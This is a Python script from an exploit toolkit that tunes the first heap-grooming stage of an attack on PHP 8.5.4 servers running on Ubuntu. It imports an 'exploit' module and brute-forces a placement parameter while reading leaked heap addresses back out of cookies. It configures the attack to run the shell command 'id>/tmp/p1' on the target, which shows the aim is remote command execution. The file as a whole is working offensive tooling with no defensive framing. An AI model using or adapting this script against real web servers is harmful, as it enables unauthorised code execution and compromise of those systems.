#!/usr/bin/env python3
"""Calibrate the stage-1 heap placement for PHP 8.5.4 on Ubuntu."""

from __future__ import annotations

import argparse
import sys
import time

import exploit


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://127.0.0.1/index.php")
    parser.add_argument("--start", type=int, default=700)
    parser.add_argument("--stop", type=int, default=1000)
    parser.add_argument("--step", type=int, default=1)
    parser.add_argument("--timeout", type=float, default=30.0)
    args = parser.parse_args()

    target = exploit.Target(args.url, timeout=args.timeout, verbose=False)
    ex = exploit.Exploit(
        target,
        "id>/tmp/p1",
        profile="bookworm",
        huge_mb=12,
        verbose=False,
    )

    last_response = {"data": b""}
    original_post = target.post

    def capture(*post_args, **post_kwargs):
        response = original_post(*post_args, **post_kwargs)
        last_response["data"] = response
        return response

    target.post = capture  # type: ignore[method-assign]

    for n in range(args.start, args.stop + 1, args.step):
        ex.rotate()
        ex.stage1_n = n
        chunk = ex.stage1()
        cookie = exploit.parse_cookie(last_response["data"])
        decoded = exploit.chunk_base_from_cookie(cookie)
        print(
            f"N={n} cookie_len={len(cookie)} chunk=0x{chunk:x} "
            f"decoded=0x{decoded:x}",
            flush=True,
        )
        if chunk:
            print(f"FOUND stage1_n={n} chunk=0x{chunk:x}")
            return 0
        time.sleep(0.15)
    return 1


if __name__ == "__main__":
    sys.exit(main())
